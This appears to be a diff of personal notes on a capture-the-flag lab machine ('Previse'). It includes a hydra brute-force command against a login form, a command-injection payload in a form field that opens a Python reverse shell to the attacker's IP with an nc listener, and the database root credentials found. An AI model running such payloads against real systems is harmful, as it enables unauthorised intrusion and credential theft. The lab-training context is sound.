@@ -23,7 +23,7 @@ Probably try cred stuffing?
 
 #### Cred stuffing
 
-    hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
+    hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
     
 Apparently it worked. `admin:asdfasdf`. Wow!
 
@@ -136,6 +136,32 @@ Apparently we're supposed to use a file containing POST data as a template.
 
 Still not working.
 
-Time to cheat, hooray!
+Fuck it, time to cheat, hooray!
 
 ## cheaty cheaty
+
+<https://medium.com/acm-juit/previse-htb-writeup-a3d0acecb937>
+
+Apparently I'm supposed to use a different method of getting reverse shell.
+
+### reverse shell part 2
+
+Attacker runs:
+
+    nc -lvp 6969
+
+Victim (on <http://10.10.11.104/file_logs.php>):
+
+    $('option').value = `delim=comma;export RHOST="10.10.14.57";export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
+    $('option').innerHTML = "payload ;)"
+
+It works, I got shell! I should keep a list of different reverse shell payloads since the bash one doesn't always work.
+
+## in da shell
+
+Looks like there's a user called m4lwhere.
+
+Also, we can now connect to the MySQL database. Look at `config.php` for creds.
+
+    mysql -u root -p'mySQL_p@ssw0rd!:)'
+    show tables;
